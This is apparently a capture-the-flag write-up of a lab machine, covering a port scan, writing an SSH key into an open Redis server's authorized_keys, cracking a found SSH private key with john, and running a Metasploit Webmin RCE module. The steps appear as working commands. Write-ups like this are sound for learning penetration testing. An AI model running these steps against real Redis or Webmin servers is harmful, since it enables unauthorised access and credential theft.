Starting with nmap we can see some valuable output.

**-p-** to scan all 65535 ports and **-sV** for standard service detection:

We are most likely going to interact with SSH since the port is open. üíÅ‚Äç‚ôÇÔ∏è

I tried couple exploits for Webmin but apparently they are not working without valid credentials.

After poking Redis service for a while I came up to a great guide/cheatsheet for pentesting Redis: <https://book.hacktricks.xyz/pentesting/6379-pentesting-redis>

> Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. Several times redis will be configured to be accessible anonymously. In this case you won't need to use any username and password.

Sounds great! So let's abuse that and follow the guide:

Install redis-tools: `sudo apt-get install redis-tools` and to interact with Redis: `redis-cli -h <IP>`

1. Generate a ssh public-private key pair on your pc: `ssh-keygen -t rsa`
2. Write the public key to a file: `(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt`
3. Import the file into redis: `cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit`
4. Save the public key to the **authorized_keys** file on redis server:

It works! We can ssh to redis server with the private key: `ssh -i id_rsa redis@10.10.10.160`

SSH as "redis" doesn't give you the user flag so we have to enumerate more.. 

SSH Private key can be found under /opt/ and it belongs to user "Matt"

Let's try to bruteforce that with john using rockyou. But first you have to convert the key to john format. I prefer using ssh2john.py <https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/ssh2john.py>

Switching user to **Matt** using the cracked password gives us the user flag.

Ok since we now have valid credentials why don't we try that Webmin exploit again? 

Fire up Metasploit and `use exploit/linux/http/webmin_packageup_rce`

Fill in the credentials + appropriate ports and ips.

Default option for SSL is false. Exploit fails if you try to run it without SSL so let's turn that on and try again.
